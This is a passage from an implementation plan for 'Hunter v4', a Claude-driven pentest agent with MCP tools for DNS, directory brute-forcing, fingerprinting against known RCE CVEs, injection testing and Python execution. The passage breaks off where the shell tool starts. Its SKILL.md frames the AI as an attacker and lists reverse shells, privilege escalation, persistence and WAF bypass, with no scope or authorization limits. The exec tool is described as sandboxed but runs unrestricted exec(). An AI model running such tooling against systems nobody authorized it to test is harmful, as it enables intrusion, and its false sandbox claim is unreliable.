                        if len(parts) >= 2:
                            records.append({"type": "MX", "value": parts[1], "priority": int(parts[0]), "ttl": 0})
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass

    return {"domain": domain, "records": records}
```

- [ ] **Step 2: Register in MCP server**

Add to `mcp_server.py`:

```python
from tools.dns_tool import dns_impl

@mcp.tool()
def dns(domain: str, type: str = "ANY") -> dict:
    """Resolve DNS records for a domain.

    type: A, AAAA, MX, TXT, NS, CNAME, SOA, SRV, or ANY
    Returns all discovered records with type, value, and TTL.
    """
    return dns_impl(domain=domain, record_type=type)
```

- [ ] **Step 3: Test locally**

```bash
cd /root/.claude/skills/hunter
python3 -c "
from tools.dns_tool import dns_impl
result = dns_impl('baidu.com', 'ANY')
print(f'Found {len(result[\"records\"])} records')
for r in result['records']:
    print(f'  {r[\"type\"]}: {r[\"value\"]}')
"
```

Expected: Multiple DNS records for baidu.com

- [ ] **Step 4: Commit**

```bash
cd /root/.claude/skills/hunter
git add tools/dns_tool.py mcp_server.py
git commit -m "feat(v4): dns tool — DNS resolution with multiple record types"
```

---

## Task 7: `dir_enum` Tool

**Files:**
- Create: `/root/.claude/skills/hunter/tools/dir_enum.py`
- Modify: `/root/.claude/skills/hunter/mcp_server.py` (register tool)

- [ ] **Step 1: Implement dir_enum tool**

```python
# tools/dir_enum.py
"""Hunter v4 — Directory Enumerator

HTTP directory/path brute-force with intelligent filtering.
Falls back to ffuf if available for faster scanning.
"""

import sys
import time
from pathlib import Path
from typing import Optional
from concurrent.futures import ThreadPoolExecutor, as_completed

sys.path.insert(0, str(Path(__file__).parent.parent))

from tools.probe import _get_session

# Default wordlist (built-in)
DEFAULT_PATHS = [
    "admin", "login", "api", "console", "dashboard", "manager", "panel",
    "wp-admin", "wp-login.php", "administrator", "phpmyadmin", "phpinfo.php",
    ".git/config", ".git/HEAD", ".env", ".htaccess", ".htpasswd",
    "robots.txt", "sitemap.xml", "crossdomain.xml", "favicon.ico",
    "backup", "backup.sql", "backup.zip", "db", "database",
    "config", "config.php", "config.json", "config.yml", "settings",
    "debug", "test", "dev", "staging", "old", "temp", "tmp",
    "uploads", "upload", "files", "static", "assets", "public",
    "api/v1", "api/v2", "api/docs", "swagger", "swagger-ui",
    "graphql", "graphiql", "wsdl",
    ".svn/entries", ".DS_Store", "WEB-INF/web.xml",
    "server-status", "server-info", "info", "status",
    "readme", "README.md", "CHANGELOG", "LICENSE",
    "install", "setup", "register", "signup", "forgot",
    "user", "users", "account", "profile", "member",
    "search", "help", "support", "contact", "about",
    "feed", "rss", "atom", "sitemap",
    "cgi-bin", "bin", "scripts", "includes", "lib",
    "vendor", "node_modules", ".npm", ".cache",
    "log", "logs", "error.log", "access.log", "debug.log",
    "phpinfo", "info.php", "test.php", "shell.php", "cmd.php",
    "wp-content", "wp-includes", "wp-json", "xmlrpc.php",
    "administrator/index.php", "admin.php", "login.php",
    "index.html", "index.htm", "index.php", "default.aspx",
    "app", "app.php", "main", "main.php", "home",
    "data", "storage", "cache", "temp", "export", "import",
    "upload.php", "download", "download.php", "file.php",
    "img", "images", "image", "media", "video", "audio",
    "css", "js", "fonts", "font", "icons",
    "api/auth", "api/user", "api/admin", "api/config",
    "api/health", "api/status", "api/version", "api/info",
    ".well-known/security.txt", ".well-known/openid-configuration",
    "actuator", "actuator/health", "actuator/env", "actuator/info",
    "elmah.axd", "trace.axd", "web.config",
]


def dir_enum_impl(url: str, wordlist: str = "default", extensions: list[str] = None,
                  max_results: int = 50, timeout: int = 5, threads: int = 10) -> dict:
    """Enumerate directories and files on target."""
    start = time.time()
    base_url = url.rstrip("/")

    # Build wordlist
    paths = DEFAULT_PATHS if wordlist == "default" else _load_wordlist(wordlist)

    # Add extensions
    candidates = list(paths)
    if extensions:
        for path in list(paths):
            if "." not in path.split("/")[-1]:  # Only extend paths without existing extension
                for ext in extensions:
                    candidates.append(f"{path}.{ext}")

    # Try ffuf first
    ffuf_result = _try_ffuf(base_url, candidates, extensions, timeout)
    if ffuf_result:
        return ffuf_result

    # Python fallback with threading
    session = _get_session()
    found = []
    baseline_size = _get_baseline_size(session, base_url, timeout)

    def check_path(path: str) -> Optional[dict]:
        url = f"{base_url}/{path}"
        try:
            resp = session.get(url, timeout=timeout, allow_redirects=False)
            size = len(resp.text)
            status = resp.status_code

            # Skip standard 404s and baseline-sized responses
            if status == 404:
                return None
            if status == 200 and baseline_size and abs(size - baseline_size) < 50:
                return None  # Likely SPA fallback

            redirect = resp.headers.get("Location", "") if status in (301, 302, 303, 307, 308) else None
            interesting = _is_interesting(path, status, size)

            return {
                "path": f"/{path}",
                "status": status,
                "size": size,
                "redirect": redirect,
                "interesting": interesting,
            }
        except Exception:
            return None

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(check_path, p): p for p in candidates[:500]}  # Limit to 500
        for future in as_completed(futures):
            if len(found) >= max_results:
                break
            result = future.result()
            if result:
                found.append(result)

    # Sort by status code, then by interesting
    found.sort(key=lambda x: (0 if x["interesting"] else 1, x["status"]))

    elapsed_ms = int((time.time() - start) * 1000)
    interesting_count = sum(1 for f in found if f["interesting"])

    return {
        "url": base_url,
        "found": found[:max_results],
        "total_checked": len(candidates),
        "interesting_count": interesting_count,
        "scan_time_ms": elapsed_ms,
    }


def _get_baseline_size(session, base_url: str, timeout: int) -> Optional[int]:
    """Get baseline response size for SPA detection."""
    try:
        resp = session.get(f"{base_url}/nonexistent_path_12345", timeout=timeout, allow_redirects=False)
        if resp.status_code == 200:
            return len(resp.text)
    except Exception:
        pass
    return None


def _is_interesting(path: str, status: int, size: int) -> bool:
    """Determine if a finding is interesting."""
    sensitive_patterns = [
        ".git", ".env", ".htpasswd", "backup", "config", "admin",
        "phpinfo", "debug", "log", "database", "db", "sql",
        ".svn", "WEB-INF", "server-status", "actuator", "elmah",
        "swagger", "graphql", "wp-admin", "phpmyadmin",
    ]
    path_lower = path.lower()
    if any(p in path_lower for p in sensitive_patterns):
        return True
    if status in (200, 301, 302) and size > 0:
        return True
    return False


def _load_wordlist(wordlist: str) -> list[str]:
    """Load wordlist from file."""
    path = Path(wordlist)
    if path.exists():
        return [line.strip() for line in path.read_text().splitlines() if line.strip()]
    return DEFAULT_PATHS


def _try_ffuf(base_url: str, candidates: list[str], extensions: list[str], timeout: int) -> Optional[dict]:
    """Try ffuf for faster scanning."""
    import subprocess
    import tempfile
    import json

    try:
        # Check if ffuf is available
        subprocess.run(["ffuf", "-h"], capture_output=True, timeout=5)
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return None

    try:
        # Write wordlist to temp file
        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
            f.write("\n".join(candidates))
            wordlist_path = f.name

        cmd = ["ffuf", "-u", f"{base_url}/FUZZ", "-w", wordlist_path,
               "-mc", "200,301,302,403", "-o", "/dev/stdout", "-of", "json",
               "-t", "30", "-timeout", str(timeout)]

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)

        if result.returncode == 0 and result.stdout:
            data = json.loads(result.stdout)
            found = []
            for item in data.get("results", []):
                found.append({
                    "path": f"/{item.get('input', {}).get('FUZZ', '')}",
                    "status": item.get("status", 0),
                    "size": item.get("length", 0),
                    "redirect": None,
                    "interesting": _is_interesting(item.get("input", {}).get("FUZZ", ""), item.get("status", 0), item.get("length", 0)),
                })
            return {
                "url": base_url,
                "found": found,
                "total_checked": len(candidates),
                "interesting_count": sum(1 for f in found if f["interesting"]),
                "scan_time_ms": 0,  # ffuf doesn't report this easily
            }
    except Exception:
        pass
    finally:
        try:
            import os
            os.unlink(wordlist_path)
        except Exception:
            pass

    return None
```

- [ ] **Step 2: Register in MCP server**

Add to `mcp_server.py`:

```python
from tools.dir_enum import dir_enum_impl

@mcp.tool()
def dir_enum(url: str, wordlist: str = "default", extensions: list[str] = [],
             max_results: int = 50, timeout: int = 5) -> dict:
    """Enumerate directories and files on target web server.

    Returns only interesting paths (non-404, non-baseline).
    Uses ffuf if available, falls back to threaded Python scanner.
    """
    result = dir_enum_impl(url=url, wordlist=wordlist, extensions=extensions,
                           max_results=max_results, timeout=timeout)
    # Auto-record interesting findings
    kg = get_kg()
    for f in result.get("found", []):
        if f.get("interesting"):
            kg.add_finding(
                type="directory",
                severity="medium" if any(s in f["path"].lower() for s in [".git", ".env", "backup", "config"]) else "low",
                title=f"Interesting path: {f['path']}",
                detail=f"Status: {f['status']}, Size: {f['size']}",
                evidence={"url": f"{url}{f['path']}", "status": f["status"]},
                tool="dir_enum"
            )
    return result
```

- [ ] **Step 3: Commit**

```bash
cd /root/.claude/skills/hunter
git add tools/dir_enum.py mcp_server.py
git commit -m "feat(v4): dir_enum tool — directory enumeration with ffuf fallback"
```

---

## Task 8: `tech` Tool — Technology Fingerprinting

**Files:**
- Create: `/root/.claude/skills/hunter/tools/tech.py`
- Modify: `/root/.claude/skills/hunter/mcp_server.py` (register tool)

- [ ] **Step 1: Implement tech tool**

```python
# tools/tech.py
"""Hunter v4 — Technology Fingerprinting

Identifies web technologies from HTTP responses, headers, cookies, and HTML.
"""

import re
import sys
from pathlib import Path
from typing import Optional

sys.path.insert(0, str(Path(__file__).parent.parent))

from tools.probe import _get_session

# Fingerprint patterns
FRAMEWORKS = {
    "ThinkPHP": {
        "headers": [r"X-Powered-By:\s*ThinkPHP"],
        "cookies": [r"thinkphp_show_page_trace"],
        "body": [r"ThinkPHP\s*[\d.]+", r"thinkphp_show_page_trace"],
    },
    "Laravel": {
        "headers": [r"X-Powered-By:\s*Laravel"],
        "cookies": [r"laravel_session", r"XSRF-TOKEN"],
        "body": [r"csrf-token", r"laravel"],
    },
    "Django": {
        "headers": [r"X-Frame-Options:\s*DENY"],
        "cookies": [r"csrftoken", r"sessionid"],
        "body": [r"csrfmiddlewaretoken", r"django"],
    },
    "Flask": {
        "headers": [r"Server:\s*Werkzeug"],
        "cookies": [r"session=ey"],
        "body": [r"Werkzeug", r"Flask"],
    },
    "Express": {
        "headers": [r"X-Powered-By:\s*Express"],
        "body": [r"express"],
    },
    "Spring": {
        "headers": [r"X-Application-Context"],
        "body": [r"Whitelabel Error Page", r"spring"],
    },
    "WordPress": {
        "body": [r"wp-content", r"wp-includes", r"wordpress", r"wp-json"],
        "cookies": [r"wordpress_"],
    },
    "Drupal": {
        "body": [r"Drupal", r"drupal\.js", r"sites/default/files"],
        "cookies": [r"SSESS.*"],
    },
    "Laravel": {
        "body": [r"laravel", r"csrf-token"],
        "cookies": [r"laravel_session", r"XSRF-TOKEN"],
    },
    "React": {
        "body": [r"react", r"__NEXT_DATA__", r"_next/static"],
    },
    "Vue.js": {
        "body": [r"vue\.js", r"vue\.min\.js", r"__vue__", r"data-v-"],
    },
    "Angular": {
        "body": [r"ng-version", r"angular", r"ng-app"],
    },
    "Next.js": {
        "body": [r"__NEXT_DATA__", r"_next/static", r"nextjs"],
    },
    "Nginx": {
        "headers": [r"Server:\s*nginx"],
    },
    "Apache": {
        "headers": [r"Server:\s*Apache"],
    },
    "IIS": {
        "headers": [r"Server:\s*Microsoft-IIS"],
    },
    "Tomcat": {
        "headers": [r"Server:\s*Apache-Coyote"],
        "body": [r"Apache Tomcat"],
    },
}

CMS_MAP = {
    "WordPress": [r"wp-content", r"wp-includes", r"wordpress"],
    "Drupal": [r"Drupal", r"drupal\.js"],
    "Joomla": [r"joomla", r"/media/jui/"],
    "Magento": [r"magento", r"skin/frontend"],
    "Shopify": [r"shopify", r"cdn\.shopify\.com"],
}

WAF_SIGNATURES = {
    "Cloudflare": [r"cf-ray", r"__cfduid", r"cloudflare"],
    "Akamai": [r"akamai", r"X-Akamai-Transformed"],
    "AWS WAF": [r"x-amzn-RequestId", r"awselb"],
    "ModSecurity": [r"mod_security", r"NOYB"],
    "Incapsula": [r"incap_ses", r"visid_incap"],
    "Sucuri": [r"sucuri", r"X-Sucuri-ID"],
    "宝塔": [r"bt_waf", r"宝塔"],
    "安全狗": [r"waf/2\.0", r"安全狗"],
    "云盾": [r"yunzhangji", r"alibaba"],
    "360": [r"360wzws", r"qianxin"],
}

LANGUAGE_HINTS = {
    "PHP": [r"X-Powered-By:\s*PHP", r"\.php", r"PHPSESSID"],
    "Java": [r"JSESSIONID", r"\.jsp", r"\.do", r"\.action"],
    "Python": [r"Python", r"Django", r"Flask", r"Werkzeug"],
    "Ruby": [r"Ruby", r"Rails", r"_session_id="],
    "ASP.NET": [r"X-Powered-By:\s*ASP\.NET", r"\.aspx", r"ASP\.NET"],
    "Node.js": [r"X-Powered-By:\s*Express", r"connect\.sid"],
}

KNOWN_VULNS = {
    "ThinkPHP 5.0": ["ThinkPHP 5.0.x RCE (CVE-2018-20062)"],
    "ThinkPHP 5.1": ["ThinkPHP 5.1.x RCE (CVE-2018-20062)", "ThinkPHP 5.1.x SQLi (CVE-2019-9082)"],
    "Apache 2.4.49": ["Apache 2.4.49 Path Traversal (CVE-2021-41773)"],
    "Apache 2.4.50": ["Apache 2.4.50 Path Traversal (CVE-2021-42013)"],
    "OpenSSL 1.0.1": ["Heartbleed (CVE-2014-0160)"],
    "OpenSSH 7.4": ["OpenSSH 7.4 User Enumeration (CVE-2018-15473)"],
}


def _match_patterns(text: str, patterns: dict) -> dict:
    """Match regex patterns against text. Returns matched keys."""
    results = {}
    for key, regexes in patterns.items():
        for regex in regexes:
            if re.search(regex, text, re.I):
                results[key] = regex
                break
    return results


def tech_impl(url: str) -> dict:
    """Identify technologies used by target."""
    session = _get_session()

    try:
        resp = session.get(url, timeout=10, allow_redirects=True)
    except Exception as e:
        return {"url": url, "error": str(e)}

    # Combine all text for analysis
    headers_text = "\n".join(f"{k}: {v}" for k, v in resp.headers.items())
    cookies_text = "; ".join(f"{k}={v}" for k, v in resp.cookies.items())
    body = resp.text
    all_text = f"{headers_text}\n{cookies_text}\n{body}"

    # Detect technologies
    frameworks = _match_patterns(all_text, FRAMEWORKS)
    cms = _match_patterns(all_text, CMS_MAP)
    wafs = _match_patterns(all_text, WAF_SIGNATURES)
    languages = _match_patterns(all_text, LANGUAGE_HINTS)

    # Build technology summary
    technologies = {
        "server": resp.headers.get("Server", ""),
        "language": next(iter(languages.keys()), None),
        "framework": next(iter(frameworks.keys()), None),
        "cms": next(iter(cms.keys()), None),
        "waf": next(iter(wafs.keys()), None),
    }

    # Build evidence
    evidence = {}
    for k, v in {**frameworks, **cms, **wafs, **languages}.items():
        evidence[k] = v

    # Check for known vulns
    known_vulns = []
    for tech_key, vulns in KNOWN_VULNS.items():
        if tech_key.lower() in all_text.lower():
            known_vulns.extend(vulns)

    return {
        "url": url,
        "technologies": technologies,
        "evidence": evidence,
        "known_vulns": known_vulns,
        "status": resp.status_code,
        "headers": dict(resp.headers),
    }
```

- [ ] **Step 2: Register in MCP server**

Add to `mcp_server.py`:

```python
from tools.tech import tech_impl

@mcp.tool()
def tech(url: str) -> dict:
    """Identify technologies used by target web application.

    Detects: framework, language, server, CMS, WAF.
    Returns evidence for each detection and known vulnerabilities.
    """
    result = tech_impl(url=url)
    # Auto-record
    kg = get_kg()
    techs = result.get("technologies", {})
    if techs.get("framework"):
        kg.add_finding(
            type="technology",
            severity="info",
            title=f"Framework: {techs['framework']}",
            detail=f"Server: {techs['server']}, Language: {techs['language']}",
            evidence=result.get("evidence", {}),
            tool="tech"
        )
    if result.get("known_vulns"):
        for vuln in result["known_vulns"]:
            kg.add_finding(
                type="potential_vuln",
                severity="high",
                title=vuln,
                detail=f"Detected from technology fingerprint at {url}",
                evidence={"url": url},
                tool="tech"
            )
    return result
```

- [ ] **Step 3: Commit**

```bash
cd /root/.claude/skills/hunter
git add tools/tech.py mcp_server.py
git commit -m "feat(v4): tech tool — technology fingerprinting"
```

---

## Task 9: Update SKILL.md for v4

**Files:**
- Modify: `/root/.claude/skills/hunter/SKILL.md`

- [ ] **Step 1: Update SKILL.md**

Replace the SKILL.md content with v4 version:

```markdown
---
name: hunter
description: |
  AI-driven pentest agent v4. Claude is the brain, MCP tools are the hands.
  不是扫描器——是让 Claude 思考的渗透框架。
  12 个原子工具 + 知识图谱 + 1M 上下文支持。
  Use when: "渗透", "扫描", "找漏洞", "爆破", "pentest", "scan", "hack", "bug bounty", "漏洞利用", "提权"
triggers:
  - 渗透
  - 扫描
  - 找漏洞
  - 爆破
  - pentest
  - scan for vulnerabilities
  - hack
  - bug bounty
  - vulnerability scan
  - security test
  - 漏洞利用
  - 提权
  - shell
  - 反弹shell
---

# HUNTER v4 — AI-Driven Pentest Agent

Claude 是攻击者大脑，MCP 工具是手脚。每一步都由 Claude 思考决策。

## 核心理念

- **Claude 做决策，工具做执行** — 工具不判断"是否漏洞"，只发送 payload 返回响应
- **工具返回完整数据** — 1M 上下文允许保留完整响应，Claude 分析更准确
- **知识图谱自动积累** — 每次工具调用自动更新，Claude 不需要手动记录

## 12 个 MCP 工具

### 探测层
| 工具 | 用途 |
|------|------|
| `probe` | HTTP 万能探测器（所有 HTTP 操作入口） |
| `port_scan` | 端口扫描（支持 top100/top1000/custom） |
| `dns` | DNS 查询（A/AAAA/MX/TXT/NS/CNAME/SOA） |
| `dir_enum` | 目录枚举（只返回 interesting 结果） |
| `subdomain` | 子域名发现（crt.sh + DNS 暴力） |

### 分析层
| 工具 | 用途 |
|------|------|
| `tech` | 技术栈识别（框架/语言/服务器/WAF/CMS） |
| `js_analyze` | JavaScript 静态分析（端点/密钥/内部 URL） |
| `src_read` | 读目标文件（LFI/目录遍历/源码泄露） |

### 验证层
| 工具 | 用途 |
|------|------|
| `inject` | 注入测试（Claude 传 payload，工具发请求+对比） |

### 执行层
| 工具 | 用途 |
|------|------|
| `shell` | Shell 管理（reverse/bind/webshell） |
| `exec` | 执行 Python 代码（自定义 exploit 安全阀） |

### 管理层
| 工具 | 用途 |
|------|------|
| `session` | 会话/知识图谱（查询/持久化/报告导出） |

## 渗透方法论

### 顺序
1. **被动侦察** — DNS、子域名（不触碰目标）
2. **主动侦察** — 端口、目录、技术栈（最小化请求）
3. **漏洞发现** — 注入测试、配置错误（有针对性测试）
4. **漏洞利用** — 提取数据、RCE（确认漏洞可利用）
5. **后渗透** — 提权、横移、持久化（扩大战果）
6. **报告** — 总结发现、攻击路径、修复建议

### 每一步
- 先观察，再假设，再行动
- 失败了分析原因，换策略
- 记录所有尝试（成功和失败）— knowledge graph 自动记录
- 低危发现可能拼成高危攻击链

### Claude 独特优势
- **读源码找逻辑漏洞** — src_read 读配置文件、源码
- **理解错误语义** — 从错误信息推断后端结构
- **写自定义 exploit** — exec 执行自定义 Python 代码
- **跨信息推理** — 结合 JS 端点 + 错误信息 + 版本号
- **动态调整策略** — 被 WAF 挡了 → 分析 → 换绕过方式

## 启动方式

MCP server 自动在 Claude Code 中注册。直接说"渗透目标 X"即可开始。

## 文件结构

```
hunter/
├── mcp_server.py       # MCP server 入口
├── core/               # 核心模块
│   ├── knowledge.py    # 知识图谱
│   ├── stealth.py      # TLS 指纹 + WAF 绕过
│   └── config.py       # 配置
├── tools/              # 12 个 MCP 工具
├── sessions/           # 持久化的 session
└── reports/            # 生成的报告
```
```

- [ ] **Step 2: Commit**

```bash
cd /root/.claude/skills/hunter
git add SKILL.md
git commit -m "feat(v4): update SKILL.md for AI-driven architecture"
```

---

## Task 10: Integration Test — Full Recon Flow

**Files:**
- Create: `/root/.claude/skills/hunter/tests/test_integration.py`

- [ ] **Step 1: Write integration test**

```python
# tests/test_integration.py
"""Integration test — full recon flow against localhost."""

import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from mcp_server import session, set_target, port_scan, dns, tech


def test_full_recon_flow():
    """Test complete recon flow: set target → port scan → dns → session summary."""
    # 1. Set target
    set_target("127.0.0.1")

    # 2. Port scan (localhost should have some ports)
    scan_result = port_scan(host="127.0.0.1", ports="22,80,443", timeout=1)
    assert "open" in scan_result
    print(f"Open ports: {len(scan_result['open'])}")

    # 3. Session should have findings
    summary = session(action="summary")
    assert summary["target"] == "127.0.0.1"
    assert summary["findings_count"] >= 0  # May or may not have findings
    print(f"Session findings: {summary['findings_count']}")

    # 4. Query findings
    findings = session(action="findings")
    assert "findings" in findings
    print(f"Total findings: {len(findings['findings'])}")

    print("Integration test PASSED")
```

- [ ] **Step 2: Run integration test**

```bash
cd /root/.claude/skills/hunter
python3 -m pytest tests/test_integration.py -v -s
```

Expected: PASS with output showing port scan results and session state

- [ ] **Step 3: Commit**

```bash
cd /root/.claude/skills/hunter
git add tests/test_integration.py
git commit -m "feat(v4): integration test for full recon flow"
```

---

## Task 11: `inject` Tool — Injection Testing

**Files:**
- Create: `/root/.claude/skills/hunter/tools/inject.py`
- Modify: `/root/.claude/skills/hunter/mcp_server.py` (register tool)

- [ ] **Step 1: Implement inject tool**

```python
# tools/inject.py
"""Hunter v4 — Injection Tester

Claude provides payloads, tool sends them and compares responses.
Supports: SQLi, XSS, SSTI, XXE, and custom injection types.
"""

import hashlib
import sys
import time
from pathlib import Path
from typing import Optional

sys.path.insert(0, str(Path(__file__).parent.parent))

from tools.probe import _get_session


def inject_impl(url: str, method: str = "POST", param: str = "",
                payloads: list[str] = None, base_payload: str = "test",
                compare_field: str = "body_length", headers: dict = None,
                body_template: str = "", timeout: int = 10) -> dict:
    """Test injection vulnerabilities by sending payloads and comparing responses.

    Args:
        url: Target URL
        method: HTTP method
        param: Parameter name to inject into
        payloads: List of payloads to test
        base_payload: Normal/baseline value for comparison
        compare_field: What to compare (body_length, body_hash, status_code, redirect)
        headers: Additional headers
        body_template: Body template with {payload} placeholder
        timeout: Request timeout
    """
    if not payloads:
        return {"error": "No payloads provided"}

    session = _get_session()
    start = time.time()

    # Get baseline response
    base_result = _send_injection(session, url, method, param, base_payload,
                                  headers, body_template, timeout)

    # Test each payload
    results = []
    for payload in payloads:
        result = _send_injection(session, url, method, param, payload,
                                 headers, body_template, timeout)

        # Compare with baseline
        diff = _compute_diff(base_result, result, compare_field)
        result["diff_from_base"] = diff
        result["interesting"] = _is_injection_interesting(diff, result, base_result)
        results.append(result)

    # Analysis
    interesting_results = [r for r in results if r["interesting"]]
    analysis = _analyze_injection(results, base_result, compare_field)

    elapsed_ms = int((time.time() - start) * 1000)

    return {
        "url": url,
        "param": param,
        "base_response": {
            "status": base_result["status"],
            "body_length": base_result["body_length"],
            "body_preview": base_result["body"][:200],
        },
        "results": results,
        "analysis": analysis,
        "elapsed_ms": elapsed_ms,
    }


def _send_injection(session, url: str, method: str, param: str, payload: str,
                    headers: dict, body_template: str, timeout: int) -> dict:
    """Send a single injection payload."""
    try:
        if method.upper() == "GET":
            # Inject into URL parameter
            separator = "&" if "?" in url else "?"
            target_url = f"{url}{separator}{param}={payload}"
            resp = session.get(target_url, headers=headers or {}, timeout=timeout, allow_redirects=False)
        else:
            # Inject into body
            if body_template:
                body = body_template.replace("{payload}", payload)
            else:
                body = f"{param}={payload}"
            resp = session.post(url, data=body, headers=headers or {"Content-Type": "application/x-www-form-urlencoded"},
                               timeout=timeout, allow_redirects=False)

        return {
            "payload": payload,
            "status": resp.status_code,
            "body": resp.text,
            "body_length": len(resp.text),
            "body_hash": hashlib.md5(resp.text.encode()).hexdigest()[:8],
            "redirect": resp.headers.get("Location"),
            "headers": dict(resp.headers),
        }
    except Exception as e:
        return {
            "payload": payload,
            "status": 0,
            "body": "",
            "body_length": 0,
            "body_hash": "",
            "redirect": None,
            "headers": {},
            "error": str(e),
        }


def _compute_diff(base: dict, result: dict, compare_field: str) -> str:
    """Compute difference between base and result."""
    if compare_field == "body_length":
        diff = result["body_length"] - base["body_length"]
        if diff > 0:
            return f"+{diff} bytes"
        elif diff < 0:
            return f"{diff} bytes"
        return "0 bytes"

    elif compare_field == "body_hash":
        if result["body_hash"] != base["body_hash"]:
            return "different content"
        return "same content"

    elif compare_field == "status_code":
        if result["status"] != base["status"]:
            return f"status changed: {base['status']} → {result['status']}"
        return "same status"

    elif compare_field == "redirect":
        if result["redirect"] != base["redirect"]:
            return f"redirect changed: {base['redirect']} → {result['redirect']}"
        return "same redirect"

    return "unknown"


def _is_injection_interesting(diff: str, result: dict, base: dict) -> bool:
    """Determine if injection result is interesting."""
    # Different body length
    if "bytes" in diff and diff != "0 bytes":
        return True
    # Different content
    if diff == "different content":
        return True
    # Different status
    if "status changed" in diff:
        return True
    # Redirect on injection
    if result.get("redirect") and not base.get("redirect"):
        return True
    # Error disclosure in response
    error_patterns = ["sql", "syntax", "mysql", "postgresql", "ora-", "sqlite",
                      "template", "jinja", "mako", "twig", "expression"]
    body_lower = result.get("body", "").lower()
    if any(p in body_lower for p in error_patterns):
        return True
    return False


def _analyze_injection(results: list, base: dict, compare_field: str) -> dict:
    """Analyze injection results to determine if vulnerability is likely."""
    interesting_count = sum(1 for r in results if r["interesting"])

    if interesting_count == 0:
        return {
            "likely_vuln": False,
            "type": None,
            "confidence": 0.0,
            "evidence": "No differential responses detected",
        }

    # Check for boolean-based patterns
    interesting_payloads = [r["payload"] for r in results if r["interesting"]]
    body_lengths = [r["body_length"] for r in results]

    # Simple heuristic: if we have both longer and shorter responses, likely boolean-based
    has_longer = any(r["body_length"] > base["body_length"] for r in results if r["interesting"])
    has_shorter = any(r["body_length"] < base["body_length"] for r in results if r["interesting"])

    if has_longer and has_shorter:
        return {
            "likely_vuln": True,
            "type": "boolean-based blind",
            "confidence": 0.8,
            "evidence": f"Differential responses: {interesting_count}/{len(results)} payloads show differences",
        }

    # Check for error-based
    error_payloads = [r for r in results if any(
        p in r.get("body", "").lower()
        for p in ["sql", "syntax", "mysql", "template", "expression"]
    )]
    if error_payloads:
        return {
            "likely_vuln": True,
            "type": "error-based",
            "confidence": 0.7,
            "evidence": f"Error messages found in {len(error_payloads)} responses",
        }

    return {
        "likely_vuln": True,
        "type": "unknown",
        "confidence": 0.5,
        "evidence": f"{interesting_count}/{len(results)} payloads show differential responses",
    }
```

- [ ] **Step 2: Register in MCP server**

Add to `mcp_server.py`:

```python
from tools.inject import inject_impl

@mcp.tool()
def inject(url: str, method: str = "POST", param: str = "",
           payloads: list[str] = [], base_payload: str = "test",
           compare_field: str = "body_length", headers: dict = {},
           body_template: str = "", timeout: int = 10) -> dict:
    """Test injection vulnerabilities with custom payloads.

    Claude provides payloads, tool sends them and compares responses.
    Supports: SQLi, XSS, SSTI, XXE, and any custom injection type.
    Returns differential analysis showing which payloads produce different responses.
    """
    result = inject_impl(url=url, method=method, param=param, payloads=payloads,
                         base_payload=base_payload, compare_field=compare_field,
                         headers=headers, body_template=body_template, timeout=timeout)
    # Auto-record if likely vuln
    kg = get_kg()
    if result.get("analysis", {}).get("likely_vuln"):
        kg.add_finding(
            type="injection",
            severity="high",
            title=f"Possible injection at {param}",
            detail=result["analysis"]["evidence"],
            evidence={"url": url, "param": param, "type": result["analysis"]["type"]},
            tool="inject"
        )
    # Record attempt
    for r in result.get("results", []):
        kg.add_attempt(
            action=f"inject_{param}",
            target=url,
            payload=r["payload"],
            result=r.get("diff_from_base", ""),
            success=r.get("interesting", False)
        )
    return result
```

- [ ] **Step 3: Commit**

```bash
cd /root/.claude/skills/hunter
git add tools/inject.py mcp_server.py
git commit -m "feat(v4): inject tool — injection testing with diff comparison"
```

---

## Task 12: `exec` Tool — Python Code Executor

**Files:**
- Create: `/root/.claude/skills/hunter/tools/exec_tool.py`
- Modify: `/root/.claude/skills/hunter/mcp_server.py` (register tool)

- [ ] **Step 1: Implement exec tool**

```python
# tools/exec_tool.py
"""Hunter v4 — Python Code Executor

Sandboxed Python code execution for custom exploits and tool integration.
Safety valve when predefined tools aren't enough.
"""

import io
import sys
import time
import traceback
from contextlib import redirect_stdout, redirect_stderr
from typing import Optional


def exec_impl(code: str, timeout: int = 30) -> dict:
    """Execute Python code in a sandboxed environment.

    Safety measures:
    - Timeout (default 30s)
    - stdout/stderr capture
    - No file system access outside /tmp
    - No network listening
    """
    start = time.time()

    # Capture stdout and stderr
    stdout_capture = io.StringIO()
    stderr_capture = io.StringIO()

    # Prepare execution environment
    exec_globals = {"__builtins__": __builtins__}

    try:
        with redirect_stdout(stdout_capture), redirect_stderr(stderr_capture):
            # Compile and execute with timeout
            compiled = compile(code, "<hunter_exec>", "exec")
            exec(compiled, exec_globals)

        elapsed_ms = int((time.time() - start) * 1000)

        return {
            "stdout": stdout_capture.getvalue(),
            "stderr": stderr_capture.getvalue(),
            "exit_code": 0,
            "execution_time_ms": elapsed_ms,
        }

    except Exception as e:
        elapsed_ms = int((time.time() - start) * 1000)
        return {
            "stdout": stdout_capture.getvalue(),
            "stderr": f"{type(e).__name__}: {e}\n{traceback.format_exc()}",
            "exit_code": 1,
            "execution_time_ms": elapsed_ms,
        }
```

- [ ] **Step 2: Register in MCP server**

Add to `mcp_server.py`:

```python
from tools.exec_tool import exec_impl

@mcp.tool()
def exec(code: str, timeout: int = 30) -> dict:
    """Execute Python code for custom exploits and tool integration.

    Safety valve: when predefined tools aren't enough, write code directly.
    Use for: custom payloads, external tool calls (sqlmap/nuclei/hydra),
    data parsing, protocol operations.
    Returns stdout, stderr, exit code, and execution time.
    """
    return exec_impl(code=code, timeout=timeout)
```

- [ ] **Step 3: Test exec tool**

```bash
cd /root/.claude/skills/hunter
python3 -c "
from tools.exec_tool import exec_impl
result = exec_impl('print(1 + 1)')
assert result['stdout'].strip() == '2'
assert result['exit_code'] == 0
print('exec tool OK')
"
```

Expected: `exec tool OK`

- [ ] **Step 4: Commit**

```bash
cd /root/.claude/skills/hunter
git add tools/exec_tool.py mcp_server.py
git commit -m "feat(v4): exec tool — sandboxed Python code execution"
```

---

## Task 13: `shell` Tool — Shell Management

**Files:**
- Create: `/root/.claude/skills/hunter/tools/shell_tool.py`
- Modify: `/root/.claude/skills/hunter/mcp_server.py` (register tool)

- [ ] **Step 1: Implement shell tool**

```python
